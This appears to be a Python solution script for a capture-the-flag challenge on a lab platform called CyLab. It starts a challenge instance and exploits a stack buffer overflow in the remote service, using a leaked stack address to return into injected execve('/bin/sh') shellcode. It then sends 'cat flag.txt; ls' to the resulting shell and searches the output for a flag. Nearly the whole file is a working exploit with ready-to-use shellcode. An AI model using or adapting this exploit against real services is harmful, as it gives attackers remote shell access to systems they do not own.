import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/143/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/143/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
SC = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")
for attempt in range(8):
    try:
        s = socket.create_connection((host, port), timeout=15)
        s.settimeout(6)
    except Exception as e:
        print("conn err", type(e).__name__)
        time.sleep(1)
        continue
    leak = b""
    t0 = time.time()
    while b"\n" not in leak and time.time() - t0 < 5:
        try:
            c = s.recv(4096)
            if not c:
                break
            leak += c
        except socket.timeout:
            break
    m = re.search(rb"0x[0-9a-f]+", leak)
    if not m:
        print("pas de leak:", leak[:80])
        s.close()
        continue
    addr = int(m.group(0), 16)
    payload = SC + b"\x90" * (0x70 - len(SC)) + b"B" * 8 + struct.pack("<Q", addr)
    if b"\n" in payload:
        s.close()
        continue
    s.sendall(b"hello\n")
    time.sleep(0.3)
    s.sendall(payload + b"\n")
    time.sleep(0.4)
    s.sendall(b"cat flag.txt; ls\n")
    out = b""
    t0 = time.time()
    while time.time() - t0 < 8:
        try:
            c = s.recv(8192)
            if not c:
                break
            out += c
        except socket.timeout:
            break
    s.close()
    txt = out.decode("latin-1", "replace")
    print("=== essai %d (addr 0x%x) ===" % (attempt + 1, addr))
    print(txt[-450:])
    fm = re.search(r"\b[0-9a-f]{20,40}\b", txt)
    if fm and "flag.txt" in txt:
        print("CANDIDAT FLAG:", fm.group(0))
        break
